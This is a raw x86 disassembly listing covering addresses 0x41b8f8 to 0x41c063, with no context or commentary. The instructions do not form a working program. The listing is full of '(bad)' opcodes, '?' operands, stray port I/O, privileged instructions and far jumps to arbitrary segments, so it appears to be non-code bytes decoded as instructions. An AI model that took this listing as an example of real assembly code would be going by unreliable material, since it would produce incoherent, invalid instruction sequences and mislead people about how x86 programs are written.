  41b8f8:	stos   BYTE PTR es:[edi],al
  41b8f9:	xchg   ecx,eax
  41b8fa:	xor    eax,0x95148645
  41b8ff:	mov    ah,0xb7
  41b901:	push   edx
  41b902:	fwait
  41b903:	jmp    0xbf02:0xd537a127
  41b90a:	imul   ebp,DWORD PTR [esp+eax*8+0x747520e0],0xffffff85
  41b912:	hlt    
  41b913:	test   al,0xd7
  41b915:	pop    ecx
  41b916:	xlat   BYTE PTR ds:[ebx]
  41b917:	ins    BYTE PTR es:[edi],dx
  41b918:	cli    
  41b919:	push   ss
  41b91a:	mov    ch,0x76
  41b91c:	in     al,dx
  41b91d:	dec    esi
  41b91e:	adc    eax,0x52dc1f80
  41b923:	loope  0x41b8d5
  41b925:	sbb    BYTE PTR [esi],al
  41b927:	outs   dx,DWORD PTR ds:[esi]
  41b928:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b929:	jb     0x41b99a
  41b92b:	fsubr  QWORD PTR ds:0xeb8f60d4
  41b931:	jmp    0x3f4b:0xf6f470f6
  41b938:	add    BYTE PTR [edi+0x71],dh
  41b93b:	mov    WORD PTR [edx+0x42],es
  41b93e:	jno    0x41b922
  41b940:	push   edi
  41b941:	adc    eax,0xa8e30907
  41b946:	lahf   
  41b947:	out    dx,al
  41b948:	out    0x7e,eax
  41b94a:	out    0xc0,al
  41b94c:	sub    al,BYTE PTR [ebx+0x43b91c1b]
  41b952:	arpl   WORD PTR [edi+0x16],cx
  41b955:	shl    ebx,cl
  41b957:	and    esp,edx
  41b959:	pop    ebx
  41b95a:	mov    BYTE PTR [edi-0x40],ah
  41b95d:	retf   
  41b95e:	jmp    0xdc68:0xe28b7c3e
  41b965:	mov    ecx,0x5d10d298
  41b96a:	aad    0x6d
  41b96c:	xor    al,0x2f
  41b96e:	scas   eax,DWORD PTR es:[edi]
  41b96f:	sbb    al,0x85
  41b971:	std    
  41b972:	ret    
  41b973:	push   0xffffffa0
  41b975:	xchg   ebx,eax
  41b976:	jnp    0x41b9a6
  41b978:	(bad)  
  41b979:	out    dx,eax
  41b97a:	fwait
  41b97b:	pop    ds
  41b97c:	push   0xf0376c86
  41b981:	arpl   WORD PTR [esp+eax*2+0x40],si
  41b985:	test   BYTE PTR [edx-0x7],ch
  41b988:	jne    0x41b9aa
  41b98a:	dec    esp
  41b98b:	mov    edx,0xbdbbd790
  41b990:	lahf   
  41b991:	(bad)  
  41b992:	mov    eax,0x99bb76e7
  41b997:	shr    BYTE PTR [esi-0x66f99e13],0xf9
  41b99e:	cmp    al,0xe7
  41b9a0:	fimul  DWORD PTR fs:[ebx-0x69a5d8dc]
  41b9a7:	data16 int3 
  41b9a9:	sub    eax,0xe1550de4
  41b9ae:	stos   DWORD PTR es:[edi],eax
  41b9af:	xchg   ecx,eax
  41b9b0:	inc    esi
  41b9b1:	popa   
  41b9b2:	xchg   edx,eax
  41b9b3:	xchg   edi,eax
  41b9b4:	mov    eax,ds:0x2a214c76
  41b9b9:	leave  
  41b9ba:	outs   dx,DWORD PTR ds:[esi]
  41b9bb:	imul   eax,DWORD PTR [esp+ecx*8],0x8ddaae14
  41b9c2:	daa    
  41b9c3:	imul   edx,DWORD PTR [edx-0x1e],0xffffffdc
  41b9c7:	jbe    0x41b9d9
  41b9c9:	dec    esi
  41b9ca:	add    DWORD PTR [edi],0xa8a5e5be
  41b9d0:	and    BYTE PTR [eax],al
  41b9d2:	jecxz  0x41b959
  41b9d4:	ins    DWORD PTR es:[edi],dx
  41b9d5:	and    DWORD PTR [edi-0x26],ebx
  41b9d8:	xor    BYTE PTR [eax],al
  41b9da:	sahf   
  41b9db:	mov    ecx,eax
  41b9dd:	adc    DWORD PTR [esi+esi*2+0x2a],edx
  41b9e1:	xor    BYTE PTR [eax+0x1],cl
  41b9e4:	pop    ebx
  41b9e5:	xor    DWORD PTR [ecx+ecx*1-0x61],edi
  41b9e9:	mov    cl,0x9f
  41b9eb:	lahf   
  41b9ec:	cli    
  41b9ed:	lods   al,BYTE PTR ds:[esi]
  41b9ee:	cld    
  41b9ef:	(bad)  
  41b9f0:	pop    eax
  41b9f1:	dec    esi
  41b9f2:	jne    0x41ba50
  41b9f4:	push   ebx
  41b9f5:	add    BYTE PTR [ebx+edx*4+0x73],ch
  41b9f9:	add    DWORD PTR [esp+edi*4+0x42],edx
  41b9fd:	nop
  41b9fe:	sbb    al,0x9f
  41ba00:	stos   BYTE PTR es:[edi],al
  41ba01:	xchg   ecx,eax
  41ba02:	or     al,0xad
  41ba04:	in     eax,dx
  41ba05:	retf   0x2be1
  41ba08:	or     edx,edi
  41ba0a:	(bad)
  41ba0d:	repz pop ebp
  41ba0f:	fiadd  WORD PTR [edi+0x36]
  41ba12:	dec    edx
  41ba13:	adc    ch,BYTE PTR [edx+0x10832a6a]
  41ba19:	jns    0x41ba31
  41ba1b:	out    0x46,al
  41ba1d:	push   cs
  41ba1e:	dec    ebp
  41ba1f:	push   0x5b907e1
  41ba24:	sbb    edi,DWORD PTR [edx+0x30b9d14c]
  41ba2a:	push   ecx
  41ba2b:	xchg   BYTE PTR [ebx-0x1b],dl
  41ba2e:	xchg   ecx,eax
  41ba2f:	data16 and BYTE PTR [ebp-0x50],ch
  41ba33:	xor    DWORD PTR [ebp+eax*4+0x76626912],edi
  41ba3a:	cdq    
  41ba3b:	mov    esp,0xfb9305e9
  41ba40:	dec    edx
  41ba41:	rol    BYTE PTR [esi+0x2fa8ecce],0x96
  41ba48:	add    eax,0x5f9398b9
  41ba4d:	adc    dl,BYTE PTR [ebx+0x40c5a217]
  41ba53:	mov    DWORD PTR [edx+edi*8],ebx
  41ba56:	aaa    
  41ba57:	nop
  41ba58:	mov    al,ds:0x782c7e0b
  41ba5d:	lds    eax,FWORD PTR [edi+0x3f]
  41ba60:	mov    ah,0xf0
  41ba62:	inc    esp
  41ba63:	sub    edx,DWORD PTR [ecx+ebp*2-0x56]
  41ba67:	pop    eax
  41ba68:	outs   dx,BYTE PTR ds:[esi]
  41ba69:	sbb    BYTE PTR [eax],ah
  41ba6b:	loope  0x41ba22
  41ba6d:	fld    DWORD PTR [esi]
  41ba6f:	cdq    
  41ba70:	xchg   esp,eax
  41ba71:	loop   0x41ba08
  41ba73:	pop    ebp
  41ba74:	sub    DWORD PTR [edi],0x71b2200c
  41ba7a:	std    
  41ba7b:	dec    ebp
  41ba7c:	xchg   ecx,eax
  41ba7d:	retf   0xd559
  41ba80:	or     al,0xbd
  41ba82:	mov    ecx,DWORD PTR [edi+0x41]
  41ba85:	jle    0x41bafb
  41ba87:	les    esp,FWORD PTR [esp]
  41ba8a:	std    
  41ba8b:	leave  
  41ba8c:	xlat   BYTE PTR ds:[ebx]
  41ba8d:	dec    eax
  41ba8e:	cwde   
  41ba8f:	lea    ecx,[ebx-0x64b42ba7]
  41ba95:	das    
  41ba96:	mov    DWORD PTR [esi-0x21],edx
  41ba99:	jecxz  0x41baa4
  41ba9b:	les    ebx,FWORD PTR [edx+ecx*2-0x2f]
  41ba9f:	adc    BYTE PTR [eax+ebx*8+0x4a17d1a1],cl
  41baa6:	mov    ebp,0xf2d3b6
  41baab:	dec    ebx
  41baac:	popf   
  41baad:	xchg   BYTE PTR [ebp+0x1b],dh
  41bab0:	add    eax,0x52e6197
  41bab5:	add    ebx,edi
  41bab7:	mov    ds:0xae37cc9d,eax
  41babc:	fisubr DWORD PTR [esi-0x28]
  41babf:	es xchg ebp,eax
  41bac1:	sysenter 
  41bac3:	mov    al,0xe9
  41bac5:	pop    esp
  41bac6:	lds    esi,FWORD PTR [ecx-0x49]
  41bac9:	sar    BYTE PTR [ecx+esi*2-0x61],1
  41bacd:	mov    dl,0x12
  41bacf:	pop    ss
  41bad0:	xor    esi,ecx
  41bad2:	stos   BYTE PTR es:[edi],al
  41bad3:	mov    bh,0x82
  41bad5:	mov    eax,0xc7d4e263
  41bada:	enter  0x649f,0xd8
  41bade:	xor    bh,al
  41bae0:	xlat   BYTE PTR ds:[ebx]
  41bae1:	shl    DWORD PTR [edx-0xd],1
  41bae4:	mov    edx,0xcf946651
  41bae9:	mov    al,ds:0xf8f5fbb0
  41baee:	add    esp,DWORD PTR [edx+0x91d6717]
  41baf4:	or     ebx,esp
  41baf6:	aam    0x17
  41baf8:	sbb    DWORD PTR [esi],esi
  41bafa:	mov    bh,0x5a
  41bafc:	sahf   
  41bafd:	mov    ds:0xf30b2433,al
  41bb02:	xor    eax,0xe2e8eaec
  41bb07:	push   eax
  41bb08:	inc    BYTE PTR [ebp-0x14]
  41bb0b:	stc    
  41bb0c:	mov    bh,0xe8
  41bb0e:	loopne 0x41baad
  41bb10:	push   esi
  41bb11:	cmp    ebp,ebp
  41bb13:	out    0x23,al
  41bb15:	adc    DWORD PTR [ebp+0x1],edx
  41bb18:	fiadd  DWORD PTR [ebx+0x622af89e]
  41bb1e:	pop    ebp
  41bb1f:	pop    ecx
  41bb20:	aaa    
  41bb21:	jb     0x41bb9e
  41bb23:	mov    ds:0x9c1daec2,eax
  41bb28:	mov    ?,ecx
  41bb2a:	jae    0x41bb32
  41bb2c:	popa   
  41bb2d:	test   eax,0x947297ef
  41bb32:	test   al,0x95
  41bb34:	inc    edi
  41bb35:	cmp    eax,DWORD PTR [ebx]
  41bb37:	mov    dh,0x6d
  41bb39:	rcr    cl,1
  41bb3b:	pusha  
  41bb3c:	rol    BYTE PTR [ecx],0x93
  41bb3f:	push   ecx
  41bb40:	fs inc eax
  41bb42:	push   cs
  41bb43:	xchg   ebp,eax
  41bb44:	stos   BYTE PTR es:[edi],al
  41bb45:	add    DWORD PTR [esi-0x66],ebp
  41bb48:	outs   dx,BYTE PTR ds:[esi]
  41bb49:	mov    cl,0xbb
  41bb4b:	jg     0x41bb27
  41bb4d:	and    DWORD PTR [eax],ecx
  41bb4f:	sbb    BYTE PTR [ebp-0x59f9f582],al
  41bb55:	sub    esp,DWORD PTR [ecx]
  41bb57:	out    0xc3,al
  41bb59:	mov    edi,DWORD PTR [ebp-0x1e]
  41bb5c:	jno    0x41bb5a
  41bb5e:	inc    ecx
  41bb5f:	test   eax,0xad8d3190
  41bb64:	pushf  
  41bb65:	shl    BYTE PTR [edx+0x5a],0x24
  41bb69:	push   0x57
  41bb6b:	les    ecx,FWORD PTR [ebp+0x44ab134e]
  41bb71:	adc    cl,BYTE PTR [ebp+0x64]
  41bb74:	test   DWORD PTR [edx+0x4e],ebx
  41bb77:	outs   dx,BYTE PTR ds:[esi]
  41bb78:	xor    bh,BYTE PTR [ecx+ebp*8+0x786c476a]
  41bb7f:	int3   
  41bb80:	fld    DWORD PTR [edx-0x3a]
  41bb83:	lds    edx,FWORD PTR [ecx]
  41bb85:	cwde   
  41bb86:	pop    esp
  41bb87:	int    0x32
  41bb89:	je     0x41bb7c
  41bb8b:	push   0x7cb6b97b
  41bb90:	test   al,0x6
  41bb92:	int    0x2e
  41bb94:	data16 jbe 0x41bb27
  41bb97:	leave  
  41bb98:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bb99:	rcl    BYTE PTR [edi-0x4f],0x7c
  41bb9d:	out    0x30,eax
  41bb9f:	cdq    
  41bba0:	enter  0x8e14,0xb9
  41bba4:	fisub  DWORD PTR [edx+ebx*1+0x4f]
  41bba8:	scas   al,BYTE PTR es:[edi]
  41bba9:	ja     0x41bbf8
  41bbab:	pop    ss
  41bbac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bbad:	lods   eax,DWORD PTR ds:[si]
  41bbaf:	mov    al,0xfe
  41bbb1:	mov    ah,0xe6
  41bbb3:	mov    esp,DWORD PTR [esi]
  41bbb5:	ss sti 
  41bbb7:	sub    al,0xbb
  41bbb9:	or     eax,0xd5ead6f
  41bbbe:	mov    edx,0x35bf5f63
  41bbc3:	shr    BYTE PTR [ebx-0xa],cl
  41bbc6:	outs   dx,DWORD PTR ds:[esi]
  41bbc7:	sub    eax,0xf69cf362
  41bbcc:	cli    
  41bbcd:	in     eax,0xc5
  41bbcf:	retf   0xe7b6
  41bbd2:	and    dl,dh
  41bbd4:	mov    ebp,esp
  41bbd6:	mov    edx,0x80c785b0
  41bbdb:	sub    edx,edi
  41bbdd:	xlat   BYTE PTR ds:[ebx]
  41bbde:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bbdf:	sti    
  41bbe0:	sub    eax,0x6c8b72cd
  41bbe5:	(bad)  
  41bbe6:	sub    BYTE PTR [edi-0x4d],ah
  41bbe9:	aas    
  41bbea:	xlat   BYTE PTR ds:[ebx]
  41bbeb:	fsubr  QWORD PTR ds:0x2a3a4f0e
  41bbf1:	mov    BYTE PTR [eax],0xf7
  41bbf4:	mov    DWORD PTR [edi],ebx
  41bbf6:	fld    TBYTE PTR ds:0x6ae341a9
  41bbfc:	ror    BYTE PTR [ebp+0x18ea272d],0xf0
  41bc03:	es stos DWORD PTR es:[edi],eax
  41bc05:	imul   ebx,DWORD PTR [ebx+0x5d],0x4a4119b
  41bc0c:	das    
  41bc0d:	jne    0x41bc7b
  41bc0f:	jne    0x41bc56
  41bc11:	xchg   ebx,eax
  41bc12:	pop    esp
  41bc13:	out    dx,al
  41bc14:	dec    eax
  41bc15:	mov    es,WORD PTR [edx]
  41bc17:	leave  
  41bc18:	arpl   WORD PTR [eax],di
  41bc1a:	add    dl,cl
  41bc1c:	xor    bl,BYTE PTR [ebx]
  41bc1e:	mov    ah,0xa3
  41bc20:	(bad)  
  41bc21:	nop
  41bc22:	jmp    0xfb42a5ec
  41bc27:	stos   DWORD PTR es:[edi],eax
  41bc28:	push   esi
  41bc29:	daa    
  41bc2a:	repnz retf 0x1c7c
  41bc2e:	int    0xb0
  41bc30:	push   eax
  41bc31:	xchg   edi,eax
  41bc32:	cwde   
  41bc33:	jp     0x41bcaa
  41bc35:	adc    BYTE PTR [ecx-0x55],ch
  41bc38:	cmp    bh,bl
  41bc3a:	dec    ebp
  41bc3b:	jb     0x41bbf7
  41bc3d:	jmp    0x41bc3a
  41bc3f:	and    ch,BYTE PTR [edx+0x23]
  41bc42:	mov    eax,0x2c3f33d5
  41bc47:	mov    eax,0xcb6b4c77
  41bc4c:	mov    ecx,edx
  41bc4e:	dec    edi
  41bc4f:	ins    DWORD PTR es:[edi],dx
  41bc50:	sub    al,cl
  41bc52:	ficom  DWORD PTR [edx+0x17]
  41bc55:	and    eax,0x7037bec5
  41bc5a:	or     dl,al
  41bc5c:	adc    edx,DWORD PTR ds:0x733cfe6d
  41bc62:	xor    al,0xe8
  41bc64:	mov    BYTE PTR [ebp-0x78],bh
  41bc67:	mov    ?,WORD PTR [edx+0xb]
  41bc6a:	or     DWORD PTR gs:[ebp+0x4],edx
  41bc6e:	sbb    BYTE PTR [esi+0x60361c35],bl
  41bc74:	out    0xef,eax
  41bc76:	mov    ah,0x97
  41bc78:	xchg   ecx,eax
  41bc79:	inc    edx
  41bc7a:	les    eax,FWORD PTR [eax+0x4099bf64]
  41bc80:	push   ds
  41bc81:	lock sub BYTE PTR [edi],bh
  41bc84:	or     BYTE PTR [esi-0x125891d3],ch
  41bc8a:	jp     0x41bcad
  41bc8c:	shr    DWORD PTR [eax+0x2a],cl
  41bc8f:	imul   DWORD PTR [ebx]
  41bc91:	jne    0x41bc19
  41bc93:	inc    ebx
  41bc94:	(bad)  
  41bc95:	jae    0x41bcd7
  41bc97:	pop    eax
  41bc98:	jecxz  0x41bc65
  41bc9a:	xor    DWORD PTR [ebx-0x2a1440ab],eax
  41bca0:	mov    edi,0xaa84880b
  41bca5:	adc    edx,DWORD PTR [edx]
  41bca7:	hlt    
  41bca8:	pop    ds
  41bca9:	fbstp  TBYTE PTR [ebp-0x42717833]
  41bcaf:	or     DWORD PTR [esi+0x9],ebx
  41bcb2:	ins    BYTE PTR es:[edi],dx
  41bcb3:	mov    ecx,DWORD PTR [edi]
  41bcb5:	jg     0x41bca7
  41bcb7:	js     0x41bcf5
  41bcb9:	sub    esp,DWORD PTR [edx]
  41bcbb:	lds    ecx,FWORD PTR [ebx-0x57]
  41bcbe:	pusha  
  41bcbf:	lods   al,BYTE PTR ds:[esi]
  41bcc0:	dec    eax
  41bcc1:	jp     0x41bc4b
  41bcc3:	mov    esi,0xa0134a1e
  41bcc8:	mov    edx,0x7de871a3
  41bccd:	aad    0x75
  41bccf:	mov    eax,ds:0x94746c8d
  41bcd4:	cmp    dh,ch
  41bcd6:	jg     0x41bccc
  41bcd8:	sti    
  41bcd9:	repnz adc eax,0x8e333e70
  41bcdf:	jbe    0x41bd4d
  41bce1:	push   0xde57b94e
  41bce6:	pop    ds
  41bce7:	loope  0x41bd1e
  41bce9:	sub    DWORD PTR [eax-0x70b3a12],ebp
  41bcef:	sub    al,0x5a
  41bcf1:	enter  0xcbb8,0x23
  41bcf5:	pop    edi
  41bcf6:	ins    BYTE PTR es:[edi],dx
  41bcf7:	sub    edx,0xffffffa1
  41bcfa:	(bad)  
  41bcfb:	jle    0x41bd3f
  41bcfd:	enter  0x5517,0xe8
  41bd01:	ror    DWORD PTR [eax+0x199f7973],1
  41bd07:	mov    edx,0xc5bf1723
  41bd0c:	dec    esi
  41bd0d:	xchg   DWORD PTR [edi+0x3c],esi
  41bd10:	fiadd  DWORD PTR [ebp+0x12]
  41bd13:	lods   eax,DWORD PTR ds:[esi]
  41bd14:	addr16 js 0x41bcf9
  41bd17:	pop    ecx
  41bd18:	sbb    DWORD PTR [ecx+ebx*2],ecx
  41bd1b:	pop    es
  41bd1c:	push   cs
  41bd1d:	mov    bl,0xe
  41bd1f:	fnstenv [ebp+0x6dfd1c79]
  41bd25:	jno    0x41bd87
  41bd27:	test   DWORD PTR [edi+eiz*4-0x53],esp
  41bd2b:	push   0xe9b705fc
  41bd30:	xchg   edi,eax
  41bd31:	and    al,0xcc
  41bd33:	adc    BYTE PTR [eax+0x75],0x13
  41bd37:	mov    ds:0x7b33b03d,al
  41bd3c:	sub    DWORD PTR [ebp-0x4d],0xae040ba1
  41bd43:	out    0x6b,al
  41bd45:	push   ds
  41bd46:	lods   al,BYTE PTR ds:[esi]
  41bd47:	(bad)  
  41bd48:	pop    ebp
  41bd49:	enter  0xd214,0x66
  41bd4d:	ror    DWORD PTR [esi-0x2c690a66],cl
  41bd53:	out    0x8c,al
  41bd55:	out    0x8a,al
  41bd57:	mov    dh,0xae
  41bd59:	lock adc DWORD PTR [ebp+0x38],0xffffff84
  41bd5e:	mov    ebx,0x814097bf
  41bd63:	mov    esp,0x98a438ec
  41bd68:	jo     0x41bd0b
  41bd6a:	(bad)  
  41bd6c:	stos   DWORD PTR es:[edi],eax
  41bd6d:	xlat   BYTE PTR ds:[ebx]
  41bd6e:	sub    bh,dl
  41bd70:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bd71:	mov    edi,0xf4e95a91
  41bd76:	inc    ecx
  41bd77:	dec    ebp
  41bd78:	mov    eax,ds:0xa69371d
  41bd7d:	lods   eax,DWORD PTR ds:[esi]
  41bd7e:	jecxz  0x41bd96
  41bd80:	add    al,0x21
  41bd82:	cs test ebx,0x5dd54
  41bd89:	sub    al,0x75
  41bd8b:	not    BYTE PTR [edx+ebx*8+0x45aa5713]
  41bd92:	push   edx
  41bd93:	int3   
  41bd94:	mov    WORD PTR [ebx-0x4398f509],?
  41bd9a:	jo     0x41be0d
  41bd9c:	pop    edx
  41bd9d:	mov    ah,0xa0
  41bd9f:	mov    dl,0x92
  41bda1:	in     eax,0x5a
  41bda3:	pop    ebp
  41bda4:	lock xor eax,0x8c53855a
  41bdaa:	mov    ds:0x6c6ae34b,eax
  41bdaf:	icebp  
  41bdb0:	xor    BYTE PTR [ebp+ecx*2-0x71d1a7e8],cl
  41bdb7:	jae    0x41bd41
  41bdb9:	bound  ebp,QWORD PTR [ecx+eiz*8]
  41bdbc:	jmp    0x41be17
  41bdbe:	add    al,BYTE PTR [ecx-0x2042e163]
  41bdc4:	pop    eax
  41bdc5:	xchg   edx,eax
  41bdc6:	inc    edi
  41bdc7:	adc    dh,0xa8
  41bdca:	shr    BYTE PTR [ecx-0x6b6ffdd],0x2b
  41bdd1:	test   ebx,esp
  41bdd3:	mov    al,0x31
  41bdd5:	test   DWORD PTR [eax+0x6427c5c9],ebx
  41bddb:	sub    cl,BYTE PTR [edx+0x5a004977]
  41bde1:	repz cdq 
  41bde3:	daa    
  41bde4:	mov    ch,BYTE PTR [esi-0x48132fdf]
  41bdea:	das    
  41bdeb:	and    esp,DWORD PTR [ecx]
  41bded:	and    eax,0xd9a682b5
  41bdf2:	pusha  
  41bdf3:	or     BYTE PTR [edi-0x73ad9beb],bl
  41bdf9:	push   ds
  41bdfa:	jnp    0x41be35
  41bdfc:	test   DWORD PTR [ebp-0x498a74ca],edx
  41be02:	jmp    0x35ef853f
  41be07:	inc    esp
  41be08:	(bad)  
  41be09:	cmp    al,0xb5
  41be0b:	mov    bh,0x96
  41be0d:	dec    esi
  41be0e:	int    0xb7
  41be10:	mov    ?,WORD PTR [edi+ecx*4+0x2f]
  41be14:	fs add eax,0x48f14fbd
  41be1a:	loope  0x41bdc1
  41be1c:	jmp    0x5fdd89f2
  41be21:	pop    ebp
  41be22:	jg     0x41bda9
  41be24:	pop    ss
  41be25:	mov    edi,0xe16c99f6
  41be2a:	gs push ebx
  41be2c:	and    ebx,0xc
  41be2f:	cmp    esp,esi
  41be31:	inc    esi
  41be32:	out    dx,eax
  41be33:	ins    DWORD PTR es:[edi],dx
  41be34:	mov    esi,0xd7ad8c35
  41be39:	push   esp
  41be3a:	pop    ebx
  41be3b:	stos   BYTE PTR es:[edi],al
  41be3c:	add    eax,0xfa7e3e3b
  41be41:	and    al,0x9a
  41be43:	cmp    ch,BYTE PTR [eax]
  41be45:	jns    0x41bdd3
  41be47:	xor    esp,eax
  41be49:	jmp    0xacedc9dd
  41be4e:	ins    BYTE PTR es:[edi],dx
  41be4f:	add    eax,0x11951ade
  41be54:	mov    esp,0x74d9a7b0
  41be59:	jge    0x41be9b
  41be5b:	add    ah,BYTE PTR [edx]
  41be5d:	mov    ebx,0xad4d3470
  41be62:	sbb    ebp,DWORD PTR [edi]
  41be64:	inc    eax
  41be65:	or     esi,0x515c935f
  41be6b:	xor    BYTE PTR [esi-0x4659c7f4],bh
  41be71:	xor    al,0x66
  41be73:	in     eax,0x94
  41be75:	jmp    0x5eabbdd8
  41be7a:	sub    al,0x35
  41be7c:	test   BYTE PTR [eax+0x3a],cl
  41be7f:	fnstcw WORD PTR [ebp+0x4d]
  41be82:	rcl    edx,cl
  41be84:	outs   dx,DWORD PTR ds:[esi]
  41be85:	nop
  41be86:	leave  
  41be87:	cmp    eax,DWORD PTR [ebx+0x60be5536]
  41be8d:	(bad)  
  41be8e:	mov    ebp,0x1e4e520
  41be93:	cwde   
  41be94:	jg     0x41bec2
  41be96:	mov    edi,0x34bd395c
  41be9b:	retf   0xfa48
  41be9e:	cmp    al,0x48
  41bea0:	ds sbb eax,0xaf5ae58e
  41bea6:	fdivr  st(1),st
  41bea8:	jmp    0x41be3d
  41beaa:	pop    esi
  41beab:	cmp    al,0x4f
  41bead:	(bad)  
  41beaf:	sub    ebp,DWORD PTR [ecx+ebx*1]
  41beb2:	sahf   
  41beb3:	test   BYTE PTR [esi-0x1e],ch
  41beb6:	pop    ds
  41beb7:	pop    edx
  41beb8:	mov    WORD PTR [edx+0x62],cs
  41bebb:	in     eax,0x4f
  41bebd:	or     eax,0x364572ec
  41bec2:	lods   al,BYTE PTR ds:[esi]
  41bec3:	in     al,0x3f
  41bec5:	xchg   ebp,eax
  41bec6:	sub    BYTE PTR [esi],dh
  41bec8:	jge    0x41bf1c
  41beca:	cwde   
  41becb:	mov    ds:0xb3e1625c,al
  41bed0:	test   BYTE PTR [esi+0x5b],bh
  41bed3:	sub    dh,dh
  41bed5:	stos   DWORD PTR es:[edi],eax
  41bed6:	jmp    0x7fb6d8ad
  41bedb:	push   es
  41bedc:	adc    eax,0xf2a8126f
  41bee1:	dec    ebx
  41bee2:	xchg   DWORD PTR [eax+0xa1e00dd],ecx
  41bee8:	(bad)  
  41bee9:	iret   
  41beea:	stos   BYTE PTR es:[edi],al
  41beeb:	retf   
  41beec:	outs   dx,DWORD PTR ds:[esi]
  41beed:	int    0xf9
  41beef:	adc    BYTE PTR [edx+0x4ee2d61f],bl
  41bef5:	dec    edi
  41bef6:	not    ah
  41bef8:	cdq    
  41bef9:	jge    0x41be8b
  41befb:	xchg   ebp,eax
  41befc:	jbe    0x41bec6
  41befe:	mov    DWORD PTR [ebx],0x7a9bc471
  41bf04:	mov    al,es:0x8933b3a
  41bf0a:	nop
  41bf0b:	adc    eax,0x8d1fbc6a
  41bf10:	push   0xf61bd80
  41bf15:	test   eax,0x5d46a0bc
  41bf1a:	cmp    ah,BYTE PTR [ebp+esi*4+0x2d68289f]
  41bf21:	or     ah,al
  41bf23:	pop    ebx
  41bf24:	pusha  
  41bf25:	out    0x2,al
  41bf27:	arpl   WORD PTR [edi-0x6df356f6],dx
  41bf2d:	repz hlt 
  41bf2f:	and    al,0xe9
  41bf31:	mov    ch,0x11
  41bf33:	sti    
  41bf34:	pop    ecx
  41bf35:	inc    edx
  41bf36:	adc    bl,cl
  41bf38:	xchg   BYTE PTR [edx-0x43c092d8],cl
  41bf3e:	jns    0x41bee1
  41bf40:	fdiv   st(6),st
  41bf42:	push   esp
  41bf43:	mov    ds:0xb82b791d,al
  41bf48:	int    0x20
  41bf4a:	jmp    0x544971c5
  41bf4f:	cmp    dl,BYTE PTR [edi+0x50]
  41bf52:	xor    al,0x3e
  41bf54:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bf55:	and    DWORD PTR [esi],0xffffff93
  41bf58:	xor    bl,cl
  41bf5a:	imul   esi,DWORD PTR [edx+0x63408eb7],0x423f49b2
  41bf64:	xor    DWORD PTR [edi+0x5a],0x67a27942
  41bf6b:	or     ch,bl
  41bf6d:	or     ch,BYTE PTR [ebp-0x75]
  41bf70:	push   0xd8b8e3a1
  41bf75:	les    esp,FWORD PTR [edx+0x295fe065]
  41bf7b:	and    ebx,DWORD PTR [edx]
  41bf7d:	(bad)  
  41bf7e:	mov    al,0x71
  41bf80:	dec    ecx
  41bf81:	push   ecx
  41bf82:	cs xor al,0x1d
  41bf85:	retf   
  41bf86:	neg    BYTE PTR ds:0x5ae893e4
  41bf8c:	clc    
  41bf8d:	lahf   
  41bf8e:	xor    cl,BYTE PTR [edx+ebp*1]
  41bf91:	mov    bl,0x36
  41bf93:	sbb    DWORD PTR [esi-0x1b98e4d5],esp
  41bf99:	sbb    esp,eax
  41bf9b:	nop
  41bf9c:	push   DWORD PTR [ebx-0x2e]
  41bf9f:	fmul   st,st(3)
  41bfa1:	add    BYTE PTR [edi-0x4a],bl
  41bfa4:	mov    dh,0x17
  41bfa6:	jns    0x41bf58
  41bfa8:	(bad)  
  41bfa9:	daa    
  41bfaa:	mov    esp,eax
  41bfac:	das    
  41bfad:	jnp    0x41bf3a
  41bfaf:	add    ebp,DWORD PTR [edi+0x7274bf61]
  41bfb5:	in     al,dx
  41bfb6:	ins    DWORD PTR es:[edi],dx
  41bfb7:	adc    ch,BYTE PTR [eax+0x71]
  41bfba:	pop    edx
  41bfbb:	sbb    bh,BYTE PTR [eax+0x592cb9b]
  41bfc1:	cs inc edi
  41bfc3:	arpl   si,dx
  41bfc5:	or     eax,0x5c709d2
  41bfca:	not    DWORD PTR [eax]
  41bfcc:	lds    esi,FWORD PTR [edx+0x55]
  41bfcf:	(bad)  
  41bfd0:	in     al,dx
  41bfd1:	stos   DWORD PTR es:[edi],eax
  41bfd2:	and    bl,BYTE PTR [esi]
  41bfd4:	ins    DWORD PTR es:[edi],dx
  41bfd5:	aas    
  41bfd6:	pop    ss
  41bfd7:	fstp   DWORD PTR [ecx-0x4f01b8f0]
  41bfdd:	mov    bl,dl
  41bfdf:	call   0xe0e:0xabb8ab7d
  41bfe6:	sahf   
  41bfe7:	mov    fs,WORD PTR [ebp+eiz*1+0x39695c7]
  41bfee:	mov    edx,0xb71bbc03
  41bff3:	add    al,ch
  41bff5:	int3   
  41bff6:	sbb    eax,0xdf9daa18
  41bffb:	cmp    DWORD PTR [edi+0x6f],ecx
  41bffe:	push   0x60cc2dd5
  41c003:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c005:	retw   
  41c007:	push   ebx
  41c008:	xor    DWORD PTR [edi+0x66],edx
  41c00b:	dec    ebx
  41c00c:	sub    al,BYTE PTR [eax]
  41c00e:	scas   eax,DWORD PTR es:[edi]
  41c00f:	mov    edx,0xccc90a0
  41c014:	add    dl,BYTE PTR [edx+0x3530b267]
  41c01a:	sbb    ch,BYTE PTR [ecx+0x7e110143]
  41c020:	cmp    DWORD PTR [edi+0x11],ebp
  41c023:	push   ecx
  41c024:	call   0x86b:0xf18d323
  41c02b:	stos   DWORD PTR es:[edi],eax
  41c02c:	jno    0x41bfbe
  41c02e:	cmp    al,0xc7
  41c030:	mov    dh,0xdd
  41c032:	lds    esi,FWORD PTR [ebp-0x67]
  41c035:	mov    dh,0xd1
  41c037:	inc    edi
  41c038:	jnp    0x41c0b6
  41c03a:	cwde   
  41c03b:	les    edx,FWORD PTR [ebp-0x7c]
  41c03e:	mov    ds:0x8a3a0911,al
  41c043:	fist   WORD PTR [esp+eiz*2]
  41c046:	push   esi
  41c047:	push   ss
  41c048:	call   0x805f3b80
  41c04d:	and    DWORD PTR [esi-0x5c],esp
  41c050:	sbb    DWORD PTR [edx-0x23ea2ed4],ebx
  41c056:	ret    0xf6fd
  41c059:	sbb    al,0x89
  41c05b:	mov    esp,0x4ceab96c
  41c060:	push   ebp
  41c061:	int    0x46
  41c063:	inc    ebx
